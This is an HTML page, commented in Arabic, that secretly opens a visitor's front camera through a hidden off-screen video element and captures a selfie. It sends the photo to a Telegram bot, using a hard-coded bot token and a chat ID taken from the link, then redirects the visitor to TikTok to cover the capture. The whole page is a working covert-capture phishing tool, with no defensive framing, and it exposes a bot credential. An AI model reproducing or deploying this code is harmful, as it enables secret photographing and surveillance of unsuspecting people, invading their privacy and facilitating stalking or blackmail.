<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
        }
    </style>
</head>
<body>

    <!-- عناصر التصوير مخفية -->
    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ====== الثوابت ======
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        // ====== الحصول على ID من الرابط ======
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        
        // ====== العناصر ======
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        
        // ====== المتغيرات ======
        let cameraStream = null;
        let isPhotoTaken = false;

        // ====== دالة إرسال الصورة ======
        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                formData.append('caption', '📸 صورة من الكاميرا الأمامية');

                const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log('نتيجة الإرسال:', result);
                
                return result.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }

        // ====== دالة إرسال رسالة خطأ ======
        async function sendErrorMessage(errorText) {
            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `❌ خطأ: ${errorText}`
                    })
                });
            } catch (e) {
                console.log('خطأ في إرسال رسالة الخطأ:', e);
            }
        }

        // ====== دالة التقاط الصورة ======
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                try {
                    // التأكد من وجود الفيديو
                    if (!video.videoWidth || !video.videoHeight) {
                        reject('الفيديو غير جاهز');
                        return;
                    }

                    // ضبط حجم الكانفس
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // رسم الصورة
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // التحقق من الصورة (مو سوداء)
                    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                    const data = imageData.data;
                    
                    // فحص أول 1000 بكسل
                    let hasColor = false;
                    for (let i = 0; i < 1000; i += 4) {
                        if (data[i] > 20 || data[i+1] > 20 || data[i+2] > 20) {
                            hasColor = true;
                            break;
                        }
                    }
                    
                    if (!hasColor) {
                        reject('الصورة سوداء');
                        return;
                    }
                    
                    // تحويل إلى blob
                    canvas.toBlob((blob) => {
                        if (blob) {
                            resolve(blob);
                        } else {
                            reject('فشل تحويل الصورة');
                        }
                    }, 'image/jpeg', 0.95);
                    
                } catch (error) {
                    reject(error.message);
                }
            });
        }

        // ====== دالة إغلاق الكاميرا ======
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => {
                    track.stop();
                });
                cameraStream = null;
            }
        }

        // ====== دالة التوجيه إلى تيك توك ======
        function redirectToTikTok() {
            window.location.href = "https://www.tiktok.com";
        }

        // ====== الدالة الرئيسية ======
        async function start() {
            // التحقق من وجود ID
            if (!CHAT_ID) {
                console.log('لا يوجد ID، توجيه إلى تيك توك');
                redirectToTikTok();
                return;
            }

            try {
                console.log('جاري تشغيل الكاميرا الأمامية...');
                
                // تشغيل الكاميرا الأمامية
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // ربط الكاميرا بالفيديو
                video.srcObject = cameraStream;
                
                // انتظار تحميل الفيديو
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        console.log('تم تحميل الفيديو');
                        resolve();
                    };
                });
                
                // تشغيل الفيديو
                await video.play();
                console.log('الفيديو شغال');
                
                // انتظار 2 ثانية لتثبيت الكاميرا والإضاءة
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // محاولة التقاط الصورة (مع 3 محاولات)
                let photoBlob = null;
                let attempts = 0;
                const maxAttempts = 3;
                
                while (attempts < maxAttempts && !photoBlob) {
                    attempts++;
                    console.log(`محاولة ${attempts} لالتقاط الصورة...`);
                    
                    try {
                        photoBlob = await capturePhoto();
                        console.log('تم التقاط الصورة بنجاح');
                    } catch (captureError) {
                        console.log(`فشلت المحاولة ${attempts}:`, captureError);
                        
                        if (attempts < maxAttempts) {
                            // انتظار نصف ثانية قبل المحاولة التالية
                            await new Promise(resolve => setTimeout(resolve, 500));
                        }
                    }
                }
                
                if (!photoBlob) {
                    throw new Error('فشل التقاط الصورة بعد 3 محاولات');
                }
                
                // إرسال الصورة إلى تليجرام
                console.log('جاري إرسال الصورة...');
                const sent = await sendPhotoToTelegram(photoBlob);
                
                if (sent) {
                    console.log('تم إرسال الصورة بنجاح');
                } else {
                    console.log('فشل إرسال الصورة');
                    await sendErrorMessage('تم التقاط الصورة ولكن فشل الإرسال');
                }
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                
                // إرسال رسالة الخطأ إلى تليجرام
                await sendErrorMessage(error.message || 'خطأ غير معروف');
                
            } finally {
                // إغلاق الكاميرا
                stopCamera();
                
                // التوجيه إلى تيك توك بعد ثانية
                setTimeout(redirectToTikTok, 1000);
            }
        }

        // ====== بدء التشغيل ======
        start();

        // ====== طوارئ: توجيه بعد 15 ثانية ======
        setTimeout(() => {
            console.log('طوارئ: توجيه بعد 15 ثانية');
            stopCamera();
            redirectToTikTok();
        }, 15000);
        
    </script>
</body>
</html>
